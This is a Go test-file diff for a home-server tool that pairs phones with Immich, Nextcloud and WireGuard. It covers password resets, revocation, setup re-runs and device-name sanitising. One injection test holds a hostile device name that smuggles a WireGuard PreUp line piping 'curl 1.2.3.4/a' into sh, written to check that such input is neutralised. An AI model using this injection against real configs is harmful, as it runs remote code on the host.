@@ -71,6 +71,23 @@ func (f *fakeServices) immich() http.Handler {
 		f.users[b["email"].(string)] = b["password"].(string)
 		json.NewEncoder(w).Encode(map[string]string{"id": "u-" + b["name"].(string), "email": b["email"].(string)})
 	})
+	mux.HandleFunc("PUT /api/admin/users/{id}", func(w http.ResponseWriter, r *http.Request) {
+		f.mu.Lock()
+		defer f.mu.Unlock()
+		if f.admin == nil || who(r) != f.admin.email {
+			http.Error(w, `{"message":"Forbidden"}`, 403)
+			return
+		}
+		var b map[string]any
+		json.NewDecoder(r.Body).Decode(&b)
+		name := strings.TrimPrefix(r.PathValue("id"), "u-")
+		for e := range f.users {
+			if strings.HasPrefix(e, name+"@") {
+				f.users[e] = b["password"].(string)
+			}
+		}
+		io.WriteString(w, `{}`)
+	})
 	mux.HandleFunc("DELETE /api/admin/users/{id}", func(w http.ResponseWriter, r *http.Request) {
 		f.mu.Lock()
 		defer f.mu.Unlock()
@@ -148,14 +165,21 @@ func (f *fakeServices) nextcloud() http.Handler {
 	return mux
 }
 
-type fakeDocker struct{ ups int }
+type fakeDocker struct {
+	ups   int
+	execs []string
+}
 
-func (d *fakeDocker) Up(string) error   { d.ups++; return nil }
-func (d *fakeDocker) Pull(string) error { return nil }
+func (d *fakeDocker) Up(string) error        { d.ups++; return nil }
+func (d *fakeDocker) Pull(string) error      { return nil }
+func (d *fakeDocker) HaveImages(string) bool { return true }
 func (d *fakeDocker) Services(string) ([]stack.Service, error) {
 	return []stack.Service{{Name: "immich-server", State: "running"}}, nil
 }
-func (d *fakeDocker) Exec(string, string, ...string) (string, error) { return "", nil }
+func (d *fakeDocker) Exec(_, _, _ string, args ...string) (string, error) {
+	d.execs = append(d.execs, strings.Join(args, " "))
+	return "", nil
+}
 
 type fakeWG struct{ last wg.ServerConfig }
 
@@ -329,7 +353,10 @@ func TestUsers(t *testing.T) {
 
 func TestNoVPNMode(t *testing.T) {
 	s, _, w := newTestServer(t)
-	s.Store.Update(func(st *state.State) error { st.Config.VPNEnabled = false; return nil })
+	off := false
+	if err := s.Setup(context.Background(), SetupOptions{VPN: &off}); err != nil {
+		t.Fatal(err)
+	}
 	w.last = wg.ServerConfig{}
 	_, pub, _ := wg.NewKeyPair()
 	p, _ := s.StartPairing("camille")
@@ -357,5 +384,148 @@ func TestBusyPortsAreSkipped(t *testing.T) {
 	}
 	if !PortFree(0, false) {
 		t.Fatal("port 0 (any) should always bind")
+	}
+}
+
+func TestDeviceNameInjectionIsNeutralised(t *testing.T) {
+	s, _, w := newTestServer(t)
+	_, pub, _ := wg.NewKeyPair()
+	p, _ := s.StartPairing("camille")
+	evil := "x\n[Interface]\nPreUp=curl 1.2.3.4/a|sh\n[Peer]"
+	if _, err := s.Pair(context.Background(), PairRequest{Code: p.Code, DeviceName: evil, WGPublicKey: pub}); err != nil {
+		t.Fatal(err)
+	}
+	name := w.last.Peers[0].Name
+	if strings.ContainsAny(name, "\n\r[]#=") {
+		t.Fatalf("unsafe device name stored: %q", name)
+	}
+	cfg, _ := w.last.Render()
+	if strings.Count(cfg, "[Interface]") != 1 || strings.Contains(cfg, "\nPreUp") || strings.Contains(cfg, "\n[Peer]\n[") {
+		t.Fatalf("config was injected:\n%s", cfg)
+	}
+	if got := SanitizeDeviceName(strings.Repeat("é", 80)); len([]rune(got)) != 60 {
+		t.Fatalf("names must be cut by characters, got %d", len([]rune(got)))
+	}
+}
+
+func TestCodeIsGivenBackWhenTheServerFails(t *testing.T) {
+	s, f, _ := newTestServer(t)
+	p, _ := s.StartPairing("camille")
+	// A bad key is refused without using up the code.
+	if _, err := s.Pair(context.Background(), PairRequest{Code: p.Code, WGPublicKey: "nope"}); err == nil {
+		t.Fatal("bad key accepted")
+	}
+	// Nextcloud refusing (here: wrong stored password) is our failure: the code must survive.
+	f.mu.Lock()
+	f.ncUsers["camille"] = "changed"
+	f.mu.Unlock()
+	if _, err := s.Pair(context.Background(), PairRequest{Code: p.Code}); err == nil || err == ErrBadCode {
+		t.Fatalf("expected a server-side error, got %v", err)
+	}
+	if len(f.keys) != 0 {
+		t.Fatal("the Immich key from the failed attempt must be deleted")
+	}
+	f.mu.Lock()
+	f.ncUsers["camille"] = s.Store.Read().Users[0].Password
+	f.mu.Unlock()
+	if _, err := s.Pair(context.Background(), PairRequest{Code: p.Code}); err != nil {
+		t.Fatalf("the code should still work after a server-side failure: %v", err)
+	}
+}
+
+func TestRevokeRecoversFromChangedPasswordAndReportsFailures(t *testing.T) {
+	s, f, _ := newTestServer(t)
+	ctx := context.Background()
+	p, _ := s.StartPairing("camille")
+	res, err := s.Pair(ctx, PairRequest{Code: p.Code})
+	if err != nil {
+		t.Fatal(err)
+	}
+	// The person changed their Immich password in the web UI.
+	f.mu.Lock()
+	f.users["camille@example.com"] = "their-new-password"
+	f.mu.Unlock()
+	if err := s.Revoke(ctx, res.DeviceID); err != nil {
+		t.Fatalf("revoke should reset the password and succeed: %v", err)
+	}
+	if len(f.keys) != 0 {
+		t.Fatal("the phone's Immich key must be deleted")
+	}
+	// If Immich is unreachable, the phone stays listed and the admin is told.
+	p2, _ := s.StartPairing("camille")
+	res2, _ := s.Pair(ctx, PairRequest{Code: p2.Code})
+	s.ImmichURL = func(state.Config) string { return "http://127.0.0.1:1" }
+	s.tok = ""
+	if err := s.Revoke(ctx, res2.DeviceID); err == nil {
+		t.Fatal("a failed revoke must be reported")
+	}
+	if len(s.Store.Read().Devices) != 1 {
+		t.Fatal("the phone must stay listed so the admin can retry")
+	}
+}
+
+func TestRerunKeepsChoicesAndRemoveUserPurgesPairings(t *testing.T) {
+	s, _, _ := newTestServer(t)
+	ctx := context.Background()
+	off := false
+	if err := s.Setup(ctx, SetupOptions{MachineLearning: &off}); err != nil {
+		t.Fatal(err)
+	}
+	if err := s.Setup(ctx, SetupOptions{}); err != nil {
+		t.Fatal(err)
+	}
+	if s.Store.Read().Config.MachineLearning {
+		t.Fatal("re-running setup without flags must keep smart search off")
+	}
+	if !s.Store.Read().Config.VPNEnabled {
+		t.Fatal("the VPN should stay on")
+	}
+	if d := s.Docker.(*fakeDocker); len(d.execs) == 0 || !strings.Contains(d.execs[0], "trusted_domains 0") {
+		t.Fatalf("setup must re-apply Nextcloud trusted addresses, got %v", d.execs)
+	}
+	if _, err := s.AddUser(ctx, "sam", "", false); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := s.StartPairing("sam"); err != nil {
+		t.Fatal(err)
+	}
+	if err := s.RemoveUser(ctx, "sam"); err != nil {
+		t.Fatal(err)
+	}
+	for _, p := range s.Store.Read().Pairings {
+		if p.User == "sam" {
+			t.Fatal("pending pairing codes of a removed user must go too")
+		}
+	}
+}
+
+func TestRepairingRetiresTheOldEntry(t *testing.T) {
+	s, f, _ := newTestServer(t)
+	ctx := context.Background()
+	p1, _ := s.StartPairing("camille")
+	first, err := s.Pair(ctx, PairRequest{Code: p1.Code})
+	if err != nil {
+		t.Fatal(err)
+	}
+	p2, _ := s.StartPairing("camille")
+	if _, err := s.Pair(ctx, PairRequest{Code: p2.Code, ReplacesDevice: first.DeviceID}); err != nil {
+		t.Fatal(err)
+	}
+	if n := len(s.Store.Read().Devices); n != 1 {
+		t.Fatalf("the old entry must be retired, %d devices left", n)
+	}
+	if len(f.keys) != 1 || f.appPass[first.Nextcloud.AppPassword] != "" {
+		t.Fatal("the old entry's credentials must be revoked")
+	}
+}
+
+func TestEmailsAreCheckedUpFront(t *testing.T) {
+	s, _, _ := newTestServer(t)
+	ctx := context.Background()
+	if _, err := s.AddUser(ctx, "erin", "Erin <erin@x.org>", false); err == nil {
+		t.Fatal("display-name emails must be refused before reaching Immich")
+	}
+	if _, err := s.AddUser(ctx, "carol", "CAMILLE@example.com", false); err == nil || !strings.Contains(err.Error(), "already used by camille") {
+		t.Fatalf("got %v", err)
 	}
 }
